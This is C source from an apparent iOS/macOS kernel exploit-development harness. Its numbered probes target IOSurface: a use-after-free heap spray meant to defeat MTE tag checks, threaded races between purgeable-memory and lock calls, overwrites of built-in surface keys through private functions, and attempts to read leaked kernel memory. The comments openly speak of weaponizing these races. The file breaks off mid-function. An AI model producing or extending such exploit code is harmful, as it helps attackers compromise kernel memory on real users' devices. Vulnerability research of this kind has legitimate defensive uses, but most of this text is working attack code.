/* r275: MTE tag collision spray via IOSurface UAF.
 * Earlier sessions confirmed: kernel dereferences IOSurface+0xD8 after free.
 * MTE has 4-bit tags = 16 values. Freed tag is excluded, so 1/15 chance
 * of collision on reallocation. Strategy: spray-and-pray with high iteration
 * count. Use purgeable to control page reuse timing.
 * Phase 1: Measure allocation timing + UAF window
 * Phase 2: Controlled spray targeting +0xD8 offset */
static volatile int r275_probed = 0;
static volatile int r275_stop = 0;
static volatile uint64_t r275_lookups_ok = 0, r275_lookups_stale = 0;
static volatile uint64_t r275_lock_on_stale = 0;

struct r275_spray_ctx {
    uint32_t target_alloc_size;
    int thread_id;
};

static void *r275_sprayer_fn(void *arg) {
    struct r275_spray_ctx *ctx = (struct r275_spray_ctx *)arg;
    uint64_t sprayed = 0;
    while (!r275_stop) {
        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        int w = 64, h = 64, bpe = 4, bpr = w*bpe, pf = 0x42475241, as = bpr*h;
        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
        CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
        CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
        CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &as);
        CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wn);
        CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hn);
        CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), bn);
        CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), rn);
        CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), pfn);
        CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), asn);
        CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
        IOSurfaceRef s = IOSurfaceCreate(p);
        CFRelease(p);
        if (s) {
            sprayed++;
            uint8_t payload[256];
            memset(payload, 0x41, sizeof(payload));
            CFDataRef d = CFDataCreate(NULL, payload, sizeof(payload));
            IOSurfaceSetValue(s, CFSTR("spray"), d);
            CFRelease(d);
            CFRelease(s);
        }
    }
    rlog("    sprayer[%d]: %llu surfaces\n", ctx->thread_id, sprayed);
    return NULL;
}

static void r275_probe(IOSurfaceRef surf) {
    uint32_t sid = IOSurfaceGetID(surf);

    rlog("\n=== r275: MTE Tag Collision Spray via IOSurface Lifecycle ===\n");
    fflush(stdout);

    /* Part 1: Measure IOSurface allocation/deallocation timing */
    rlog("\n--- Part 1: Alloc/dealloc timing ---\n");
    {
        uint64_t t0, t1;
        IOSurfaceRef timing_surfs[100];

        t0 = mach_absolute_time();
        for (int i = 0; i < 100; i++) {
            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            int w = 64, h = 64, bpe = 4, bpr = w*bpe, pf = 0x42475241, as = bpr*h;
            CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
            CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
            CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
            CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
            CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &as);
            CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), bn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), rn);
            CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), pfn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), asn);
            CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
            timing_surfs[i] = IOSurfaceCreate(p);
            CFRelease(p);
        }
        t1 = mach_absolute_time();
        rlog("  100 creates: %llu ticks (%llu per surface)\n", t1-t0, (t1-t0)/100);

        t0 = mach_absolute_time();
        for (int i = 0; i < 100; i++) {
            if (timing_surfs[i]) CFRelease(timing_surfs[i]);
        }
        t1 = mach_absolute_time();
        rlog("  100 releases: %llu ticks (%llu per surface)\n", t1-t0, (t1-t0)/100);
        fflush(stdout);
    }

    /* Part 2: Stale ID lookup timing — how fast do IDs get reclaimed? */
    rlog("\n--- Part 2: ID reuse analysis ---\n");
    {
        uint32_t ids[50];
        for (int i = 0; i < 50; i++) {
            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            int w = 32, h = 32, bpe = 4, bpr = w*bpe, pf = 0x42475241, as = bpr*h;
            CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
            CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
            CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
            CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
            CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &as);
            CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), bn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), rn);
            CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), pfn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), asn);
            CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
            IOSurfaceRef s = IOSurfaceCreate(p);
            CFRelease(p);
            ids[i] = s ? IOSurfaceGetID(s) : 0;
            if (s) CFRelease(s);
        }
        rlog("  IDs allocated then freed: ");
        for (int i = 0; i < 10; i++) rlog("%u ", ids[i]);
        rlog("...\n");

        int reused = 0;
        for (int i = 0; i < 50; i++) {
            IOSurfaceRef s = IOSurfaceLookup(ids[i]);
            if (s) {
                reused++;
                CFRelease(s);
            }
        }
        rlog("  IDs still lookupable after free: %d/50\n", reused);

        IOSurfaceRef new_surfs[50];
        uint32_t new_ids[50];
        for (int i = 0; i < 50; i++) {
            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            int w = 32, h = 32, bpe = 4, bpr = w*bpe, pf = 0x42475241, as = bpr*h;
            CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
            CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
            CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
            CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
            CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &as);
            CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), bn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), rn);
            CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), pfn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), asn);
            CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
            new_surfs[i] = IOSurfaceCreate(p);
            CFRelease(p);
            new_ids[i] = new_surfs[i] ? IOSurfaceGetID(new_surfs[i]) : 0;
        }
        int id_reuse = 0;
        for (int i = 0; i < 50; i++) {
            for (int j = 0; j < 50; j++) {
                if (ids[i] == new_ids[j]) { id_reuse++; break; }
            }
        }
        rlog("  ID reuse between batches: %d/50\n", id_reuse);
        for (int i = 0; i < 50; i++) {
            if (new_surfs[i]) CFRelease(new_surfs[i]);
        }
        fflush(stdout);
    }

    /* Part 3: Create/destroy race with concurrent spray — 3 seconds */
    rlog("\n--- Part 3: Create/destroy race (3s, 2 sprayers + 2 racers) ---\n");
    {
        r275_stop = 0;
        r275_lookups_ok = 0;
        r275_lookups_stale = 0;
        r275_lock_on_stale = 0;

        struct r275_spray_ctx sctx1 = { 16384, 0 };
        struct r275_spray_ctx sctx2 = { 16384, 1 };
        pthread_t spray1, spray2;
        pthread_create(&spray1, NULL, r275_sprayer_fn, &sctx1);
        pthread_create(&spray2, NULL, r275_sprayer_fn, &sctx2);

        uint64_t race_start = mach_absolute_time();
        uint64_t three_sec = 3ULL * 24000000ULL;
        uint64_t stale_reads = 0;

        while (mach_absolute_time() - race_start < three_sec) {
            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            int w = 64, h = 64, bpe = 4, bpr = w*bpe, pf = 0x42475241, as = bpr*h;
            CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
            CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
            CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
            CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
            CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &as);
            CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), bn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), rn);
            CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), pfn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), asn);
            CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);

            IOSurfaceRef s = IOSurfaceCreate(p);
            CFRelease(p);
            if (!s) continue;
            uint32_t id = IOSurfaceGetID(s);
            mach_port_t mp = IOSurfaceCreateMachPort(s);

            IOSurfaceSetValue(s, CFSTR("marker"), CFSTR("owned"));
            CFRelease(s);

            IOSurfaceRef stale = IOSurfaceLookup(id);
            if (stale) {
                r275_lookups_ok++;
                CFTypeRef marker = IOSurfaceCopyValue(stale, CFSTR("marker"));
                if (marker) {
                    if (CFGetTypeID(marker) == CFStringGetTypeID()) {
                        char buf[32];
                        CFStringGetCString((CFStringRef)marker, buf, 32, kCFStringEncodingUTF8);
                        if (strcmp(buf, "owned") != 0) {
                            stale_reads++;
                        }
                    }
                    CFRelease(marker);
                } else {
                    stale_reads++;
                }
                CFRelease(stale);
            } else {
                r275_lookups_stale++;
            }

            if (mp != MACH_PORT_NULL) {
                mach_port_deallocate(mach_task_self(), mp);
            }
        }

        r275_stop = 1;
        pthread_join(spray1, NULL);
        pthread_join(spray2, NULL);

        rlog("  lookups_ok=%llu lookups_stale=%llu stale_marker_reads=%llu\n",
             r275_lookups_ok, r275_lookups_stale, stale_reads);
        if (stale_reads > 0) {
            rlog("  *** STALE DATA READ: marker changed on %llu lookups ***\n", stale_reads);
        }
        fflush(stdout);
    }

    __sync_fetch_and_add(&r275_probed, 1);
    rlog("\n*** r275 probe complete ***\n");
    fflush(stdout);
}

/* r274: Weaponize purge race — purgeable memory confusion.
 * r273 CONFIRMED: 100% of surface memory zeroed while lock thread was writing.
 * Kernel zeroes purgeable-volatile surface memory on demand.
 * Strategy: create large surfaces, make them volatile, force memory pressure
 * to trigger actual page reclamation, then check if we can read kernel data
 * from the stale mapping. Also test IOSurface+Metal shared memory overlap. */
static volatile int r274_probed = 0;
static volatile int r274_stop = 0;

static void *r274_purge_pressure_thread(void *arg) {
    IOSurfaceRef *surfs = (IOSurfaceRef *)arg;
    while (!r274_stop) {
        for (int i = 0; i < 50; i++) {
            if (surfs[i]) {
                IOSurfaceSetPurgeable(surfs[i], 2, NULL);
                IOSurfaceSetPurgeable(surfs[i], 0, NULL);
            }
        }
    }
    return NULL;
}

static void r274_probe(IOSurfaceRef surf) {
    uint32_t sid = IOSurfaceGetID(surf);
    kern_return_t kr;

    rlog("\n=== r274: Purgeable Memory Confusion + Stale Mapping ===\n");
    fflush(stdout);

    /* Part 1: Purge + immediate re-lock — read whatever the kernel left */
    rlog("\n--- Part 1: Purge volatile then immediate lock+read ---\n");
    {
        IOSurfaceLock(surf, 0, NULL);
        volatile uint8_t *base = IOSurfaceGetBaseAddress(surf);
        size_t sz = (size_t)(IOSurfaceGetBytesPerRow(surf) * IOSurfaceGetHeight(surf));
        if (base) {
            memset((void*)base, 0xDE, sz);
        }
        IOSurfaceUnlock(surf, 0, NULL);
        rlog("  filled surface with 0xDE (%zu bytes)\n", sz);

        IOSurfaceSetPurgeable(surf, 2, NULL);
        rlog("  set purgeable=volatile\n");

        usleep(1000);

        IOSurfaceSetPurgeable(surf, 0, NULL);
        rlog("  set purgeable=nonvolatile\n");

        IOSurfaceLock(surf, 1, NULL);
        base = IOSurfaceGetBaseAddress(surf);
        int non_de = 0, non_zero = 0;
        uint8_t sample[16];
        if (base) {
            for (size_t i = 0; i < sz; i++) {
                if (base[i] != 0xDE) non_de++;
                if (base[i] != 0 && base[i] != 0xDE) non_zero++;
            }
            memcpy(sample, (void*)base, 16);
        }
        IOSurfaceUnlock(surf, 1, NULL);
        rlog("  after purge cycle: %d/%zu bytes changed, %d non-zero/non-DE\n", non_de, sz, non_zero);
        rlog("  first 16 bytes: ");
        for (int i = 0; i < 16; i++) rlog("%02x ", sample[i]);
        rlog("\n");
        if (non_zero > 0) {
            rlog("  *** STALE DATA DETECTED: kernel data readable through surface ***\n");
        }
        fflush(stdout);
    }

    /* Part 2: Create 50 large surfaces, make volatile, trigger memory pressure */
    rlog("\n--- Part 2: Memory pressure with 50 large volatile surfaces ---\n");
    {
        IOSurfaceRef lsurfs[50];
        int w = 1024, h = 1024, bpe = 4, bpr = w*bpe, pf = 0x42475241, as = bpr*h;
        int created = 0;
        for (int i = 0; i < 50; i++) {
            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
            CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
            CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
            CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
            CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &as);
            CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), bn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), rn);
            CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), pfn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), asn);
            CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
            lsurfs[i] = IOSurfaceCreate(p);
            CFRelease(p);
            if (lsurfs[i]) {
                created++;
                IOSurfaceLock(lsurfs[i], 0, NULL);
                void *b = IOSurfaceGetBaseAddress(lsurfs[i]);
                if (b) memset(b, 0xAA, as);
                IOSurfaceUnlock(lsurfs[i], 0, NULL);
            }
        }
        rlog("  created %d/50 surfaces (each 4MB, total ~%dMB)\n", created, created*4);

        for (int i = 0; i < 50; i++) {
            if (lsurfs[i]) IOSurfaceSetPurgeable(lsurfs[i], 2, NULL);
        }
        rlog("  all set volatile\n");

        usleep(50000);

        int purged_count = 0;
        for (int i = 0; i < 50; i++) {
            if (lsurfs[i]) {
                uint32_t oldState = 0;
                IOSurfaceSetPurgeable(lsurfs[i], 0, &oldState);
                if (oldState == 3) purged_count++;
            }
        }
        rlog("  purged (state 3) surfaces: %d/50\n", purged_count);

        int stale_data_surfs = 0;
        for (int i = 0; i < 50; i++) {
            if (lsurfs[i]) {
                IOSurfaceLock(lsurfs[i], 1, NULL);
                volatile uint8_t *b = IOSurfaceGetBaseAddress(lsurfs[i]);
                int non_zero_non_aa = 0;
                if (b) {
                    for (int j = 0; j < 4096; j++) {
                        if (b[j] != 0 && b[j] != 0xAA) non_zero_non_aa++;
                    }
                }
                IOSurfaceUnlock(lsurfs[i], 1, NULL);
                if (non_zero_non_aa > 0) {
                    stale_data_surfs++;
                    if (stale_data_surfs <= 3) {
                        rlog("  surf[%d] has %d stale bytes in first 4KB\n", i, non_zero_non_aa);
                        IOSurfaceLock(lsurfs[i], 1, NULL);
                        b = IOSurfaceGetBaseAddress(lsurfs[i]);
                        if (b) {
                            rlog("    first 32 bytes: ");
                            for (int j = 0; j < 32; j++) rlog("%02x ", b[j]);
                            rlog("\n");
                        }
                        IOSurfaceUnlock(lsurfs[i], 1, NULL);
                    }
                }
            }
        }
        rlog("  surfaces with stale data: %d/50\n", stale_data_surfs);
        if (stale_data_surfs > 0) {
            rlog("  *** KERNEL DATA LEAK VIA PURGEABLE SURFACES ***\n");
        }

        for (int i = 0; i < 50; i++) {
            if (lsurfs[i]) CFRelease(lsurfs[i]);
        }
        fflush(stdout);
    }

    /* Part 3: Release surface while purgeable thread still active */
    rlog("\n--- Part 3: Surface lifecycle vs purgeable race ---\n");
    {
        IOSurfaceRef raceSurfs[10];
        int w = 256, h = 256, bpe = 4, bpr = w*bpe, pf = 0x42475241, as = bpr*h;
        for (int i = 0; i < 10; i++) {
            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
            CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
            CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
            CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
            CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &as);
            CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), bn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), rn);
            CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), pfn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), asn);
            CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
            raceSurfs[i] = IOSurfaceCreate(p);
            CFRelease(p);
        }

        mach_port_t ports[10];
        for (int i = 0; i < 10; i++) {
            ports[i] = raceSurfs[i] ? IOSurfaceCreateMachPort(raceSurfs[i]) : MACH_PORT_NULL;
        }
        rlog("  created 10 surfaces + mach ports\n");

        for (int i = 0; i < 10; i++) {
            if (raceSurfs[i]) {
                IOSurfaceSetPurgeable(raceSurfs[i], 2, NULL);
                CFRelease(raceSurfs[i]);
                raceSurfs[i] = NULL;
            }
        }
        rlog("  set volatile + released all CFRefs\n");

        usleep(10000);

        int recovered = 0;
        for (int i = 0; i < 10; i++) {
            if (ports[i] != MACH_PORT_NULL) {
                IOSurfaceRef rsurf = IOSurfaceLookupFromMachPort(ports[i]);
                if (rsurf) {
                    recovered++;
                    IOSurfaceLock(rsurf, 1, NULL);
                    volatile uint8_t *b = IOSurfaceGetBaseAddress(rsurf);
                    int has_data = 0;
                    if (b) {
                        for (int j = 0; j < 256; j++) {
                            if (b[j] != 0) has_data++;
                        }
                    }
                    IOSurfaceUnlock(rsurf, 1, NULL);
                    if (i < 3) rlog("  recovered surf[%d] id=%u has_nonzero=%d\n",
                                    i, IOSurfaceGetID(rsurf), has_data);
                    CFRelease(rsurf);
                }
                mach_port_deallocate(mach_task_self(), ports[i]);
            }
        }
        rlog("  recovered %d/10 surfaces via mach port after release+purge\n", recovered);
        fflush(stdout);
    }

    __sync_fetch_and_add(&r274_probed, 1);
    rlog("\n*** r274 probe complete ***\n");
    fflush(stdout);
}

/* r273: Purgeable+Lock race, SetDataValueBytes, ClientAlign, concurrent purge.
 * r272: UseCount clamped (no underflow), Purgeable state machine works,
 *   double-unlock rejected, XPC round-trip works. No protection flags.
 * Key targets: purgeable race (purge surface memory while locked/in use),
 *   SetDataValueBytes (raw byte writes to surface property store),
 *   ClientAlign (unknown function). */
static volatile int r273_probed = 0;
static volatile int r273_purge_stop = 0;

struct r273_purge_ctx {
    IOSurfaceRef surf;
    int iterations;
};

static void *r273_purge_thread(void *arg) {
    struct r273_purge_ctx *ctx = (struct r273_purge_ctx *)arg;
    for (int i = 0; i < ctx->iterations && !r273_purge_stop; i++) {
        IOSurfaceSetPurgeable(ctx->surf, 2, NULL);
        IOSurfaceSetPurgeable(ctx->surf, 0, NULL);
    }
    return NULL;
}

static void *r273_lock_thread(void *arg) {
    struct r273_purge_ctx *ctx = (struct r273_purge_ctx *)arg;
    for (int i = 0; i < ctx->iterations && !r273_purge_stop; i++) {
        IOSurfaceLock(ctx->surf, 0, NULL);
        volatile uint8_t *base = IOSurfaceGetBaseAddress(ctx->surf);
        if (base) {
            base[0] = 0x42;
            base[1] = 0x43;
        }
        IOSurfaceUnlock(ctx->surf, 0, NULL);
    }
    return NULL;
}

static void r273_probe(IOSurfaceRef surf) {
    uint32_t sid = IOSurfaceGetID(surf);
    kern_return_t kr;

    rlog("\n=== r273: Purgeable+Lock Race + SetDataValueBytes + ClientAlign ===\n");
    fflush(stdout);

    void *iosfc = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);

    /* Part 1: IOSurfaceSetDataValueBytes */
    rlog("\n--- Part 1: IOSurfaceSetDataValueBytes ---\n");
    {
        typedef kern_return_t (*SetDVB_t)(IOSurfaceRef, CFStringRef, const void*, size_t);
        typedef kern_return_t (*CopyDVB_t)(IOSurfaceRef, CFStringRef, void*, size_t*);
        SetDVB_t setDVB = NULL;
        CopyDVB_t copyDVB = NULL;
        if (iosfc) {
            setDVB = (SetDVB_t)dlsym(iosfc, "IOSurfaceSetDataValueBytes");
            copyDVB = (CopyDVB_t)dlsym(iosfc, "IOSurfaceCopyDataValueBytes");
        }

        if (setDVB) {
            uint8_t testdata[256];
            for (int i = 0; i < 256; i++) testdata[i] = (uint8_t)i;

            kr = setDVB(surf, CFSTR("raw_test"), testdata, 256);
            rlog("  SetDataValueBytes('raw_test', 256 bytes)=0x%x\n", kr);

            if (copyDVB && kr == 0) {
                uint8_t readback[256];
                size_t readlen = 256;
                memset(readback, 0, 256);
                kr = copyDVB(surf, CFSTR("raw_test"), readback, &readlen);
                rlog("  CopyDataValueBytes('raw_test')=0x%x len=%zu\n", kr, readlen);
                if (kr == 0 && readlen == 256) {
                    int match = (memcmp(testdata, readback, 256) == 0);
                    rlog("  round-trip match=%d\n", match);
                }
            }

            /* Try large data */
            uint8_t bigdata[65536];
            memset(bigdata, 0xAA, sizeof(bigdata));
            kr = setDVB(surf, CFSTR("big_raw"), bigdata, 65536);
            rlog("  SetDataValueBytes('big_raw', 64KB)=0x%x\n", kr);

            /* Try overwriting a built-in key */
            uint8_t fake[4] = {0xFF, 0xFF, 0x00, 0x00};
            kr = setDVB(surf, CFSTR("IOSurfaceWidth"), fake, 4);
            rlog("  SetDataValueBytes('IOSurfaceWidth', 4 bytes)=0x%x\n", kr);
            uint32_t realW = (uint32_t)IOSurfaceGetWidth(surf);
            rlog("  actual width after overwrite=%u\n", realW);

            /* Try zero-length */
            kr = setDVB(surf, CFSTR("empty"), NULL, 0);
            rlog("  SetDataValueBytes('empty', 0 bytes)=0x%x\n", kr);
        } else {
            rlog("  SetDataValueBytes not found\n");
        }
        fflush(stdout);
    }

    /* Part 2: IOSurfaceClientAlign */
    rlog("\n--- Part 2: IOSurfaceClientAlign ---\n");
    {
        typedef IOSurfaceClientRef (*ClientLookup_t)(uint32_t);
        typedef kern_return_t (*ClientAlign_t)(IOSurfaceClientRef, uint32_t);
        ClientLookup_t cLookup = NULL;
        ClientAlign_t cAlign = NULL;
        if (iosfc) {
            cLookup = (ClientLookup_t)dlsym(iosfc, "IOSurfaceClientLookup");
            cAlign = (ClientAlign_t)dlsym(iosfc, "IOSurfaceClientAlign");
        }

        if (cAlign && cLookup) {
            IOSurfaceClientRef client = cLookup(sid);
            rlog("  client=%p\n", client);
            if (client) {
                for (uint32_t align = 0; align <= 16; align++) {
                    kr = cAlign(client, align);
                    rlog("  ClientAlign(%u)=0x%x\n", align, kr);
                    if (kr != 0 && align > 0) break;
                }
                typedef void (*ClientRelease_t)(IOSurfaceClientRef);
                ClientRelease_t cRelease = (ClientRelease_t)dlsym(iosfc, "IOSurfaceClientRelease");
                if (cRelease) cRelease(client);
            }
        } else {
            rlog("  ClientAlign or ClientLookup not found\n");
        }
        fflush(stdout);
    }

    /* Part 3: Purgeable + Lock race */
    rlog("\n--- Part 3: Purgeable + Lock race (2 threads, 500 iterations) ---\n");
    {
        IOSurfaceLock(surf, 0, NULL);
        volatile uint8_t *base = IOSurfaceGetBaseAddress(surf);
        if (base) {
            memset((void*)base, 0x42, 64*64*4);
        }
        IOSurfaceUnlock(surf, 0, NULL);
        rlog("  surface initialized with 0x42\n");

        r273_purge_stop = 0;
        struct r273_purge_ctx pctx = { surf, 500 };
        struct r273_purge_ctx lctx = { surf, 500 };
        pthread_t pt, lt;
        pthread_create(&pt, NULL, r273_purge_thread, &pctx);
        pthread_create(&lt, NULL, r273_lock_thread, &lctx);
        pthread_join(pt, NULL);
        pthread_join(lt, NULL);

        IOSurfaceLock(surf, 0, NULL);
        base = IOSurfaceGetBaseAddress(surf);
        int zeroed = 0;
        if (base) {
            for (int i = 0; i < 64*64*4; i++) {
                if (base[i] == 0) { zeroed++; }
            }
        }
        IOSurfaceUnlock(surf, 0, NULL);
        rlog("  post-race: %d/%d bytes zeroed (purge effect)\n", zeroed, 64*64*4);
        if (zeroed > 0) {
            rlog("  *** PURGE RACE EFFECT: memory was zeroed while in use ***\n");
        }
        fflush(stdout);
    }

    /* Part 4: Create many surfaces, purge rapidly, check for stale pointers */
    rlog("\n--- Part 4: Rapid create/purge/destroy cycle ---\n");
    {
        IOSurfaceRef surfs[20];
        int w2 = 32, h2 = 32, bpe2 = 4, bpr2 = w2*bpe2, pf2 = 0x42475241, as2 = bpr2*h2;
        for (int i = 0; i < 20; i++) {
            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w2);
            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h2);
            CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe2);
            CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr2);
            CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf2);
            CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &as2);
            CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), bn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), rn);
            CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), pfn);
            CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), asn);
            CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
            surfs[i] = IOSurfaceCreate(p);
            CFRelease(p);
        }
        rlog("  created 20 surfaces\n");

        for (int i = 0; i < 20; i++) {
            if (surfs[i]) {
                IOSurfaceSetPurgeable(surfs[i], 2, NULL);
            }
        }
        rlog("  all set purgeable=volatile\n");

        for (int i = 0; i < 20; i += 2) {
            if (surfs[i]) CFRelease(surfs[i]);
            surfs[i] = NULL;
        }
        rlog("  released even-numbered surfaces\n");

        int stale = 0;
        for (int i = 1; i < 20; i += 2) {
            if (surfs[i]) {
                uint32_t oldState = 99;
                IOSurfaceSetPurgeable(surfs[i], 0, &oldState);
                if (oldState == 3) stale++;
                rlog("  surf[%d] id=%u purgeable oldState=%u\n", i, IOSurfaceGetID(surfs[i]), oldState);
                CFRelease(surfs[i]);
            }
        }
        rlog("  stale (purged) surfaces: %d/10\n", stale);
        fflush(stdout);
    }

    /* Part 5: IOSurfaceGetSurfaceID from ClientRef — check if leaks kernel ptr */
    rlog("\n--- Part 5: ClientGetSurfaceID ---\n");
    {
